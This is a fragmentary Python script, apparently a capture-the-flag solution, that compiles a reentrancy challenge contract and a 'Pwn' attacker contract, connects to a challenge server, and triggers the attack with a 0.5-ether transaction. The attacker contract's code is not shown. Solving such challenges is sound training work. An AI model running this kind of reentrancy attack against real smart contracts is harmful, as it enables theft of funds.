...
ReEntrancy = open('./ReEntrancy.sol').read()
Pwn = open('./Pwn.sol').read()
p = remote('140.112.31.97', '30003')
...
def Start():
    ...
    ReEntrancy_sol = compile_standard({
        "language": "Solidity",
        "sources":
        {
            "ReEntrancy.sol": {
    ...
    FACTORY_ABI = json.loads(ReEntrancy_sol['contracts']['ReEntrancy.sol']['ReEntrancyFactory']['metadata'])['output']['abi']
    FACTORY_BYTECODE = ReEntrancy_sol['contracts']['ReEntrancy.sol']['ReEntrancyFactory']['evm']['bytecode']['object']
...
if __name__ == "__main__":
    ...
    ReEntrancy_ADDRESS = factory.call('instances', address)

    pwn.send_transaction('run', address, private_key, ReEntrancy_ADDRESS, value = 	500000000000000000)
